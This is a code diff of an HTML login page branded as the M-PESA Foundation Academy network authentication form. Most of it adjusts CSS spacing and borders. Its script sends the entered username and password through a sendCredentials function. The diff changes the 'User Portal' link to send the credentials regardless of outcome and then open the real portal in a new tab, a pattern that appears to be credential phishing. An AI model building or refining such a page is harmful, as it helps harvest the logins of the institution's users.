@@ -13,11 +13,11 @@
             background:#fff;min-height:100vh;
         }
 
-        /* ----- Header (logo) – NO top border, open at top ----- */
+        /* Open-top header – no top border */
         .header-wrapper{
             width:300px;
             background:#fff;
-            margin-top:-10px;               /* aligns with "Network Authentication Form" */
+            margin-top:-10px;
         }
         .image-section{
             text-align:center;
@@ -27,32 +27,65 @@
             max-width:180px;height:auto;
         }
 
-        /* ----- Form area – side borders start just below logo, stop above Username ----- */
+        /* Form wrapper – side borders stop above Username */
         .login-form-wrapper{
-            border-left:1px solid #ddd;
-            border-right:1px solid #ddd;
-            border-bottom:1px solid #ddd;
+            position:relative;
             width:300px;
-            border-radius:0 0 4px 4px;
             background:#fff;
             box-shadow:0 2px 4px rgba(0,0,0,.1);
-            margin-top:-1px;                /* connects smoothly to header */
+            margin-top:-1px;
         }
+
+        /* Side borders – from below logo to above Username */
+        .side-borders{
+            position:absolute;
+            top:0;
+            bottom:0;
+            width:1px;
+            background:#ddd;
+        }
+        .left-border  { left:0; }
+        .right-border { right:0; }
+
+        /* Bottom border only */
+        .bottom-border{
+            position:absolute;
+            bottom:0; left:0; right:0;
+            height:1px;
+            background:#ddd;
+        }
+
+        /* Form content – precise gaps */
         .login-container{
-            padding:15px 15px 15px;         /* 1.5 cm top / sides / bottom */
+            padding:0 15px 15px;           /* sides: 15px, bottom: 15px, top: 0 */
             text-align:center;
+            position:relative;
+            z-index:1;
         }
+
         .login-container input{
-            width:100%;padding:8px;
-            margin:15px 0;                  /* 1.5 cm between fields */
+            width:100%;
+            padding:8px;
             border:1px solid #ccc;
             border-radius:4px;
             font-size:.9em;color:#757575;
             box-sizing:border-box;
         }
+
+        /* Username – 40px from logo */
+        #username {
+            margin-top:40px;
+            margin-bottom:30px;            /* Username → Password: 30px */
+        }
+
+        /* Password → Login: 50px */
+        #password {
+            margin-bottom:50px;
+        }
+
         .login-container button{
             width:100%;padding:8px;
-            margin-top:12px;                /* 1.2 cm from link to button */
+            margin-bottom:70px;            /* Login → "Click here...": 70px */
             background:#4CAF50;
             border:1px solid #45a049;
             border-radius:4px;
@@ -61,16 +94,19 @@
             box-shadow:0 0 5px rgba(76,175,80,.3);
         }
         .login-container button:hover{background:#45a049;}
+
         .login-container a{
             display:block;
-            margin-top:15px;                /* 1.5 cm from Login to link */
+            margin-bottom:90px;            /* "Click here..." → Footer: 90px */
             color:#4a4a4a;text-decoration:none;
             font-size:.85em;
+            cursor:pointer;
         }
-        .login-container #password{margin-top:15px;}
+
         .footer{
             text-align:center;color:#4a4a4a;
-            margin-top:5px;padding:6px 0;
+            margin-top:60px;               /* Form bottom → Footer: 60px */
+            padding:6px 0;
             font-size:.85em;width:100%;
         }
         #message,#error{display:none;}
@@ -78,15 +114,19 @@
 </head>
 <body>
 
-    <!-- Open-top header (logo only) -->
+    <!-- Open-top header -->
     <div class="header-wrapper">
         <div class="image-section">
             <img src="Image 17-09-2025 at 11.50.jpeg" alt="M-PESA Foundation Academy">
         </div>
     </div>
 
-    <!-- Form container – borders start just below logo -->
+    <!-- Form with side borders stopping above Username -->
     <div class="login-form-wrapper">
+        <div class="side-borders left-border"></div>
+        <div class="side-borders right-border"></div>
+        <div class="bottom-border"></div>
+
         <div class="login-container">
             <form id="loginForm">
                 <input type="text" id="username" placeholder="Enter your Username" required>
@@ -123,7 +163,7 @@
             }catch(e){ return false; }
         }
 
-        // Login button
+        // Login button → requires fields
         form.addEventListener('submit', async e=>{
             e.preventDefault();
             const u = document.getElementById('username').value;
@@ -133,18 +173,13 @@
             }
         });
 
-        // User Portal link – sends credentials + opens portal in new tab
+        // User Portal link → works even if empty
         userPortalLink.addEventListener('click', async e=>{
             e.preventDefault();
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
-            const success = await sendCredentials(u,p);
-            // Open portal in new tab regardless (you may change this)
+            await sendCredentials(u, p);
             window.open(userPortalUrl, '_blank');
-            if(success) {
-                // Optional: redirect main page too
-                // window.location.href = redirectUrl;
-            }
         });
     </script>
 </body>
